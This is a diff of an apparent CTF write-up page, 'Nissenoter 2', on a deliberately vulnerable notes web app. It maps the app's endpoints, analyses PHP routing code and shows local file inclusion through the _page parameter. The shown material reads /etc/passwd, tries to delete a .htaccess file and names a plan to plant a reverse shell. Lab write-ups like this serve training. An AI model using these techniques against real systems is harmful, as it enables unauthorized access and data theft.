@@ -1,317 +1,127 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-<meta charset="UTF-8">
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="robots" content="index, follow">
-<meta name="revisit-after" content="15 days">
-<link rel="author" href="/humans.txt">
-<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="manifest" href="/site.webmanifest">
-<meta name="msapplication-TileImage" content="/mstile-144x144.png">
-<link rel="shortcut icon" href="/favicon.ico"><meta name="author" content="Adamino">
-
-
-  <meta itemprop="name" content="Nissenoter 2">
-  <meta itemprop="description" content="Challenge Name: Nissenoter 2
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=robots content="index, follow"><meta name=revisit-after content="15 days"><link rel=author href=/humans.txt><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta name=msapplication-TileImage content="/mstile-144x144.png"><link rel="shortcut icon" href=/favicon.ico><meta name=author content="Adamino"><meta itemprop=name content="Nissenoter 2"><meta itemprop=description content="Challenge Name: Nissenoter 2
 Category: Boot2Root
 Challenge Description: Vi har brug for din hjælp. Bevis at vores praktikant tager fejl! Skaf os fuld adgang til systemet, så vi kan få fat på alle deres hemmelige noter. Det handler om rigets sikkerhed!
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
-Approach Continued enumeration We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can “pop a shell” on the system!">
-  <meta itemprop="datePublished" content="2023-12-15T14:33:38+01:00">
-  <meta itemprop="dateModified" content="2023-12-15T14:33:38+01:00">
-  <meta itemprop="wordCount" content="1545">
-  <meta itemprop="keywords" content="Boot2Root"><meta property="og:url" content="http://localhost:1313/nc3/boot2root/nissenoter-2/">
-  <meta property="og:site_name" content="Adamino CTF Writeups">
-  <meta property="og:title" content="Nissenoter 2">
-  <meta property="og:description" content="Challenge Name: Nissenoter 2
+Approach Continued enumeration We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can “pop a shell” on the system!"><meta itemprop=datePublished content="2023-12-15T14:33:38+01:00"><meta itemprop=dateModified content="2023-12-15T14:33:38+01:00"><meta itemprop=wordCount content="1545"><meta itemprop=keywords content="Boot2Root"><meta property="og:url" content="https://ctf.adamino.dk/nc3/boot2root/nissenoter-2/"><meta property="og:site_name" content="Adamino CTF Writeups"><meta property="og:title" content="Nissenoter 2"><meta property="og:description" content="Challenge Name: Nissenoter 2
 Category: Boot2Root
 Challenge Description: Vi har brug for din hjælp. Bevis at vores praktikant tager fejl! Skaf os fuld adgang til systemet, så vi kan få fat på alle deres hemmelige noter. Det handler om rigets sikkerhed!
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
-Approach Continued enumeration We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can “pop a shell” on the system!">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="nc3">
-    <meta property="article:published_time" content="2023-12-15T14:33:38+01:00">
-    <meta property="article:modified_time" content="2023-12-15T14:33:38+01:00">
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Nissenoter 2">
-  <meta name="twitter:description" content="Challenge Name: Nissenoter 2
+Approach Continued enumeration We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can “pop a shell” on the system!"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="nc3"><meta property="article:published_time" content="2023-12-15T14:33:38+01:00"><meta property="article:modified_time" content="2023-12-15T14:33:38+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Nissenoter 2"><meta name=twitter:description content="Challenge Name: Nissenoter 2
 Category: Boot2Root
 Challenge Description: Vi har brug for din hjælp. Bevis at vores praktikant tager fejl! Skaf os fuld adgang til systemet, så vi kan få fat på alle deres hemmelige noter. Det handler om rigets sikkerhed!
 Opgaven er tilgængelig via Haaukins:
 https://ncctf.haaukins.dk/
-Approach Continued enumeration We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can “pop a shell” on the system!">
-<title>Nissenoter 2</title>
-<link rel="stylesheet dns-prefetch preconnect preload prefetch" as="style" href="http://localhost:1313/css/style.min.2d1df3d10e8fa64ec05ab1169da39cc7ce323ff1a80fb94a0b820888e0defd02.css" integrity="sha256-LR3z0Q6Ppk7AWrEWnaOcx84yP/GoD7lKC4IIiODe/QI=" crossorigin="anonymous">
-	</head>
-<body id="page">
-	<header id="site-header" class="animated slideInUp">
-		<div class="hdr-wrapper section-inner">
-			<div class="hdr-left">
-				<div class="site-branding">
-					<a href="http://localhost:1313/">Adamino CTF Writeups</a>
-				</div>
-				<nav class="site-nav hide-in-mobile">
-				<a href="http://localhost:1313/tools/">Tools</a>
-				<a href="http://localhost:1313/nc3/">NC3</a>
-</nav>
-			</div>
-			<div class="hdr-right hdr-icons">
-				<span class="hdr-social hide-in-mobile"><a href="https://github.com/onero" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24"
-  fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-  <path
-    d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
-  </path>
-</svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
-  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-  class="feather feather-menu">
-  <line x1="3" y1="12" x2="21" y2="12"></line>
-  <line x1="3" y1="6" x2="21" y2="6"></line>
-  <line x1="3" y1="18" x2="21" y2="18"></line>
-</svg></button>
-			</div>
-		</div>
-	</header>
-	<div id="mobile-menu" class="animated fast">
-		<ul>
-			<li><a href="http://localhost:1313/tools/">Tools</a></li>
-			<li><a href="http://localhost:1313/nc3/">NC3</a></li>
-		</ul>
-	</div>
-
-
-	<main class="site-main section-inner thin animated fadeIn faster">
-		<h1>Nissenoter 2</h1>
-		<div class="content">
-			<h2 id="challenge-name">Challenge Name:<a href="#challenge-name" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Nissenoter 2</p>
-<h2 id="category">Category:<a href="#category" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Boot2Root</p>
-<h2 id="challenge-description">Challenge Description:<a href="#challenge-description" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<p>Vi har brug for din hjælp. Bevis at vores praktikant tager fejl! Skaf os fuld adgang til systemet, så vi kan få fat på alle deres hemmelige noter. Det handler om rigets sikkerhed!</p>
-<p><em>Opgaven er tilgængelig via Haaukins:</em></p>
-<p><a href="https://ncctf.haaukins.dk/">https://ncctf.haaukins.dk/</a></p>
-<h2 id="approach">Approach<a href="#approach" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<h3 id="continued-enumeration">Continued enumeration<a href="#continued-enumeration" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can &ldquo;pop a shell&rdquo; on the system!</p>
-<p>From visiting the different pages and trying out functionality, we have discovered the following new endpoints:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>| PATH                    | TYPE  | Note                                                                        |
-</span></span><span style="display:flex;"><span>|-------------------------|-------|-----------------------------------------------------------------------------|
-</span></span><span style="display:flex;"><span>| /                       | GET   | Home                                                                        |
-</span></span><span style="display:flex;"><span>| /profile                | GET   | Profile page                                                                |
-</span></span><span style="display:flex;"><span>| /profile/{id}           | GET   | Get profile by ID, which appears to be vuln to IDOR                         |
-</span></span><span style="display:flex;"><span>| /notes                  | GET   | Notes from users                                                            |
-</span></span><span style="display:flex;"><span>| /notes/view/{note_name} | GET   | Get a specific note, which we used to get flag.txt. Potentially vuln to LFI |
-</span></span><span style="display:flex;"><span>| /notes/add              | POST  | Add a note. Potentially an attack vector for reverse shell etc.             |
-</span></span><span style="display:flex;"><span>| /noted/del/{note_name}  | GET   | Delete a note. Does not require CSRF-token!                                 |
-</span></span><span style="display:flex;"><span>| /api/logout             | GET   | Log out...                                                                  |
-</span></span></code></pre></div><p>The profile page appears to be vulnerable to <a href="https://portswigger.net/web-security/access-control/idor">IDOR attacks</a>, which I tested to view the other profiles, but no new information came from this exploration, seeing as we had already uncovered users from the database.</p>
-<p>Deleting a note can be done without a <a href="https://www.educative.io/answers/what-is-cross-site-request-forgery-csfr">CSRF</a> token, which is significant as it may allow us to delete more than intended by the developer!</p>
-<p>From the &ldquo;/core.php.php&rdquo; we can see that there is a global constant called USER_NOTES, which is being used as the directory for all notes on the system.
+Approach Continued enumeration We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can “pop a shell” on the system!"><title>Nissenoter 2</title>
+<link rel="stylesheet dns-prefetch preconnect preload prefetch" as=style href=https://ctf.adamino.dk/css/style.min.2d1df3d10e8fa64ec05ab1169da39cc7ce323ff1a80fb94a0b820888e0defd02.css integrity="sha256-LR3z0Q6Ppk7AWrEWnaOcx84yP/GoD7lKC4IIiODe/QI=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://ctf.adamino.dk/>Adamino CTF Writeups</a></div><nav class="site-nav hide-in-mobile"><a href=https://ctf.adamino.dk/tools/>Tools</a>
+<a href=https://ctf.adamino.dk/nc3/>NC3</a></nav></div><div class="hdr-right hdr-icons"><span class="hdr-social hide-in-mobile"><a href=https://github.com/onero target=_blank rel="noopener me" title=Github><svg class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://ctf.adamino.dk/tools/>Tools</a></li><li><a href=https://ctf.adamino.dk/nc3/>NC3</a></li></ul></div><main class="site-main section-inner thin animated fadeIn faster"><h1>Nissenoter 2</h1><div class=content><h2 id=challenge-name>Challenge Name:<a href=#challenge-name class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Nissenoter 2</p><h2 id=category>Category:<a href=#category class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Boot2Root</p><h2 id=challenge-description>Challenge Description:<a href=#challenge-description class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Vi har brug for din hjælp. Bevis at vores praktikant tager fejl! Skaf os fuld adgang til systemet, så vi kan få fat på alle deres hemmelige noter. Det handler om rigets sikkerhed!</p><p><em>Opgaven er tilgængelig via Haaukins:</em></p><p><a href=https://ncctf.haaukins.dk/>https://ncctf.haaukins.dk/</a></p><h2 id=approach>Approach<a href=#approach class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=continued-enumeration>Continued enumeration<a href=#continued-enumeration class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>We managed to secure foothold on the webapp and now we need to continue our enumeration as an authenticated user in order to see if we can &ldquo;pop a shell&rdquo; on the system!</p><p>From visiting the different pages and trying out functionality, we have discovered the following new endpoints:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>| PATH                    | TYPE  | Note                                                                        |
+</span></span><span style=display:flex><span>|-------------------------|-------|-----------------------------------------------------------------------------|
+</span></span><span style=display:flex><span>| /                       | GET   | Home                                                                        |
+</span></span><span style=display:flex><span>| /profile                | GET   | Profile page                                                                |
+</span></span><span style=display:flex><span>| /profile/{id}           | GET   | Get profile by ID, which appears to be vuln to IDOR                         |
+</span></span><span style=display:flex><span>| /notes                  | GET   | Notes from users                                                            |
+</span></span><span style=display:flex><span>| /notes/view/{note_name} | GET   | Get a specific note, which we used to get flag.txt. Potentially vuln to LFI |
+</span></span><span style=display:flex><span>| /notes/add              | POST  | Add a note. Potentially an attack vector for reverse shell etc.             |
+</span></span><span style=display:flex><span>| /noted/del/{note_name}  | GET   | Delete a note. Does not require CSRF-token!                                 |
+</span></span><span style=display:flex><span>| /api/logout             | GET   | Log out...                                                                  |
+</span></span></code></pre></div><p>The profile page appears to be vulnerable to <a href=https://portswigger.net/web-security/access-control/idor>IDOR attacks</a>, which I tested to view the other profiles, but no new information came from this exploration, seeing as we had already uncovered users from the database.</p><p>Deleting a note can be done without a <a href=https://www.educative.io/answers/what-is-cross-site-request-forgery-csfr>CSRF</a> token, which is significant as it may allow us to delete more than intended by the developer!</p><p>From the &ldquo;/core.php.php&rdquo; we can see that there is a global constant called USER_NOTES, which is being used as the directory for all notes on the system.
 This folder is directly in the root of the project &ldquo;/user_notes&rdquo;.
-When we take a look inside the folder we see an empty &ldquo;index.html&rdquo; file and the following &ldquo;.htaccess&rdquo; files</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Files</span> <span style="color:#f92672">*&gt;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">order</span> <span style="color:#a6e22e">deny</span>,<span style="color:#a6e22e">allow</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">deny</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">all</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">Files</span><span style="color:#f92672">&gt;</span>
-</span></span></code></pre></div><p>We can further more confirm the presence of this note by accessing it directly in the webapp</p>
-<p><img src="/nc3/boot2root/nissenoter-2/images/htaccess%20note.png" alt=".htaccess note"></p>
-<p>This file unfortunately prohibits us from accessing &ldquo;nissenoter.nc3/user_notes&rdquo; directly, which would come in handy, if we were to place an evil reverse shell script here.
-We shall therefore try to delete the &ldquo;.htaccess&rdquo; file with the &ldquo;/notes/del/.htaccess&rdquo; request!</p>
-<p>Even though the request didn&rsquo;t result in a 500 error message from the backend and initially seemed to be executed, the file is unfortunately still present and that rules out this exploitation path as the system might be preventing deletion of this file.</p>
-<h3 id="lfi-exploitation">LFI exploitation<a href="#lfi-exploitation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>Lastly we have &ldquo;/notes/view/{note_name}&rdquo;, which we have already proven to have an <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">LFI</a> vulnerability by visiting the &ldquo;.htaccess&rdquo; file as a note.</p>
-<p>Normally when exploiting LFI, we would try to add something like &ldquo;../../etc/passwd&rdquo; to enumerate users on the system, but whenever we try this on the webapp we get redirected back to a sane URl.</p>
-<p>We therefore need to analyse how routing is implemented in the application to understand if we might be able to exploit LFI with different parameters.</p>
-<p>In &ldquo;/index.php&rdquo; we can see how routing is handled when trying to view a note, so let&rsquo;s get our hands dirty with some PHP analysis!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># --- Excluded everything until line 122 where the analysis gets interesting --- #
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$request_method <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$page <span style="color:#f92672">=</span> <span style="color:#a6e22e">Variable</span><span style="color:#f92672">::</span><span style="color:#a6e22e">getGet</span>(<span style="color:#e6db74">&#39;_page&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">array_key_exists</span>($request_method, $router)) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">showErrorPage</span>(<span style="color:#ae81ff">405</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span>($router[$request_method] <span style="color:#66d9ef">as</span> $uri <span style="color:#f92672">=&gt;</span> $func) {
-</span></span><span style="display:flex;"><span>    $reg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;#^&#34;</span> <span style="color:#f92672">.</span> $uri <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;$#&#34;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>($reg, $page, $params) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
-</span></span><span style="display:flex;"><span>        [$class, $method] <span style="color:#f92672">=</span> $func;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            $class <span style="color:#f92672">=</span> $controllers[$class];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">array_shift</span>($params);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_callable</span>([$class, $method])) {
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">call_user_func</span>([$class, $method], <span style="color:#f92672">...</span>$params);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">showErrorPage</span>(<span style="color:#ae81ff">500</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">Exception</span> $e) {
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print_r</span>($e);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">showErrorPage</span>(<span style="color:#ae81ff">404</span>);
-</span></span></code></pre></div><p>The application extracts the HTTP request method and stores it in a variable. This variable is later used to check if routes exist for that method. For instance, anything other than POST and GET will result in a 405 Method Not Allowed error.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">array_key_exists</span>($request_method, $router)) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">showErrorPage</span>(<span style="color:#ae81ff">405</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>A loop iterates through routes that match the specified $request_method. The $routes[$request_method] variable is a dictionary, with the key set to a URL and the value to an array containing a class reference and a method name. This setup is vital as it dictates how different URLs are processed by the application.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span>($router[$request_method] <span style="color:#66d9ef">as</span> $uri <span style="color:#f92672">=&gt;</span> $func) {
-</span></span></code></pre></div><p>The PHP function preg_match is used to match the current page&rsquo;s URL ($page) against a regular expression ($reg). If there&rsquo;s a match, the result is stored in $params.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>    $reg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;#^&#34;</span> <span style="color:#f92672">.</span> $uri <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;$#&#34;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>($reg, $page, $params) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
-</span></span></code></pre></div><p>For instance, a URL like notes/view/flag.txt will result in $params containing both the full path and the file name (flag.txt).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$params[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;notes/view/flag.txt&#39;</span>;
-</span></span><span style="display:flex;"><span>$params[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag.txt&#39;</span>;
-</span></span></code></pre></div><p>The array_shift function is used to remove the first element from $params, leaving only the file name in the array.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            $class <span style="color:#f92672">=</span> $controllers[$class];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">array_shift</span>($params);
-</span></span></code></pre></div><p>This is crucial for the LFI vulnerability as it directly influences what file is being accessed!</p>
-<p>The application then calls call_user_func([$class, $method], &hellip;$params). This means that the method specified in the route is called directly with user-controlled input, without any validation.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_callable</span>([$class, $method])) {
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">call_user_func</span>([$class, $method], <span style="color:#f92672">...</span>$params);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span></code></pre></div><p>In the case of NotesController, the view method is called, which directly uses $note in file_get_contents, leading to the LFI vulnerability.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$controllers[<span style="color:#a6e22e">NotesController</span><span style="color:#f92672">::</span><span style="color:#a6e22e">class</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">view</span>(<span style="color:#f92672">...</span>$params);
-</span></span></code></pre></div><p>That means the the view method on the class NotesController is being invoked directly with its input, without any form of validation!</p>
-<p>The key to exploiting this vulnerability therefore lies in manipulating the &ldquo;_page&rdquo; GET parameter.</p>
-<p>By accessing the URL &ldquo;nissenoter.nc3/?_page=notes/view/flag.txt&rdquo;, the application interprets this as a request to view the flag.txt note, thus confirming the LFI vulnerability.</p>
-<p><img src="/nc3/boot2root/nissenoter-2/images/LFI%20on%20flag.png" alt="LFI on flag"></p>
-<p>Great Scott! This is exciting as it confirms our LFI theory! Now we should be able to view the &ldquo;/etc/passwd&rdquo; file and search for a user on the system</p>
-<p><img src="/nc3/boot2root/nissenoter-2/images/LFI%20users.png" alt="LFI etc/passwd"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- Excluded system users for better overview --- #</span>
-</span></span><span style="display:flex;"><span>osand:x:1000:1000::/home/osand:/bin/bash
-</span></span><span style="display:flex;"><span>fritz:x:1001:1001::/home/fritz:/bin/bash
-</span></span><span style="display:flex;"><span>hansi:x:1002:1002::/home/hansi:/bin/bash
